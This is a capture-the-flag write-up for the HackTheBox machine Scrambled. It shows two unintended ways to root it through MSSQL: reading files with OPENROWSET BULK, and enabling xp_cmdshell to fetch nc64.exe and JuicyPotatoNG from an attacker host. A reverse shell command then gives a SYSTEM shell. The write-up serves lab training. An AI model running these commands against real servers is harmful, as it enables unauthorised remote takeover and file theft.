---
title: HTB: Scrambled - Alternative Roots
url: https://0xdf.gitlab.io/2022/10/01/htb-scrambled-beyond-root.html
date: 2022-10-01T13:45:00+00:00
tags: htb-scrambled, ctf, hackthebox, windows, mssql, mssql-file-read, juicypotatong, xp-cmdshell, potato, seimpersonate
---

## Alternative Roots

There were two unintended paths that I’m aware of, both of which abused MSSQL.

### Unintended File Read Via MSSQL

Wh04m1 got root blood on Scrambled using this technique. [This post on MSSQL Tips](https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/) talks about how to read a file using MSSQL using the `BULK` option, which was added to SQL Server 2005. Their example query is:

```

SELECT BulkColumn 
FROM OPENROWSET (BULK 'c:\temp\mytxtfile.txt', SINGLE_CLOB) MyFile 

```

`OPENROWSET` returns a single column named `BulkColumn`. `MyFile` is a correlation name, which isn’t really important here other than it must exist, and it doesn’t really matter what I put there.

`OPENROWSET`, when used with the `BULK` provider takes a file path and one of three keywords:
- `SINGLE_BLOB` returns as a `varbinary`
- `SINGLE_CLOB` returns as a `varchar`
- `SINGLE_NCLOB` returns as a `nvarchar`

So to read `root.txt`, I’ll run:

```

SQL> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) MyFile
BulkColumn
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   

b'a01b823bd0d7c97c98646d36d1d03c02\r\n' 

```

### RoguePotato

#### Get Execution Via MSSQL

To get to a place where I could run RoguePotato, I’ll need to be executing with the `SeImpersonatePrivilege`. I’m most likely to find this through the MSSQL service.

To run commands via MSSQL, I’ll use the `xp_cmdshell` stored procedure. If I try to run this initially, it will fail:

```

SQL> xp_cmdshell whoami
[-] ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```

I can reconfigure that with the [following four lines](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16):

```

SQL> EXECUTE sp_configure 'show advanced options', 1
[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> EXECUTE sp_configure 'xp_cmdshell', 1
[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE

```

Now it works:

```

SQL> xp_cmdshell whoami
output
--------------------------------------------------------------------------------

scrm\sqlsvc

NULL   

```

#### Privilege Check

The service is running as scrm\sqlsvc, which does have `SeImpersonate`:

```

SQL> xp_cmdshell whoami /priv
output
--------------------------------------------------------------------------------
NULL
PRIVILEGES INFORMATION
----------------------
NULL
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
NULL

```

#### JuicyPotatoNG

RoguePotato will work on Scrambled, but I’ll use this opportunity to show off [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG), the latest Potato which was released just over a week before Scrambled retired.

The details of the exploit can be found [here](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/), and involve a significant understanding of Windows internals details.

Practically speaking, I can download the compiled exe from the [release page](https://github.com/antonioCoco/JuicyPotatoNG/releases/latest), and serve it from my webserver along with two other files:
- `nc64.exe`, which I’ll use to get a reverse shell
- `rev.bat`, which simply invokes `nc64.exe` to return a reverse shell to my VM:

  ```

  C:\\programdata\\nc64.exe -e cmd 10.10.14.6 443

  ```

Staging out of `C:\ProgramData\`, I’ll upload all three to Scrambled from MSSQL:

```

SQL> xp_cmdshell powershell curl 10.10.14.6/nc64.exe -outfile C:\\programdata\\nc64.exe
output
--------------------------------------------------------------------------------
NULL
SQL> xp_cmdshell powershell curl 10.10.14.6/rev.bat -outfile C:\\programdata\\rev.bat
output
--------------------------------------------------------------------------------
NULL
SQL> xp_cmdshell powershell curl 10.10.14.6/JuicyPotatoNG.exe -outfile C:\\programdata\\jp.exe
output
--------------------------------------------------------------------------------
NULL

```

Now with `nc` listening on my host, I’ll invoke JuicyPotatoNG:

```

SQL> xp_cmdshell C:\\programdata\\jp.exe -t * -p C:\\programdata\\rev.bat
output
--------------------------------------------------------------------------------
NULL
NULL
         JuicyPotatoNG
         by decoder_it & splinter_code
NULL
[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessWithTokenW OK
[+] Exploit successful!
NULL 

```

It reports success, and there is a shell running as SYSTEM at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.168 63184
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```